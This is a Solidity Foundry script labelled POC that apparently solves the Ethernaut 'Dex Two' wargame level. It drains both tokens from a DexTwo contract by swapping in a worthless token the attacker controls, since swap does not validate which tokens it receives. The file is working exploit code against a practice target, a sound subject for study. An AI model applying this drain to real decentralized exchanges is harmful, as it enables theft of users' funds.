// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {DexTwo} from "../src/Dex2.sol";

contract POC is Script {

    DexTwo public dexTwo;

    function run() external{
        vm.startBroadcast();

        dexTwo = DexTwo(0xB7f8a4dBC8bb9bA98878D8D2a74431F6B61a65d2);
        address BTN = address(0x013e688ca8681adD8f2FD9506F7a0be4BB797455);
        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();

        dexTwo.swap(BTN, token1, 100);
        dexTwo.swap(BTN, token2, 200);

        console.log("Remaining token1 balance : ", dexTwo.balanceOf(token1, address(dexTwo)));
        console.log("Remaining token2 balance : ", dexTwo.balanceOf(token2, address(dexTwo)));

        vm.stopBroadcast();
    }
}
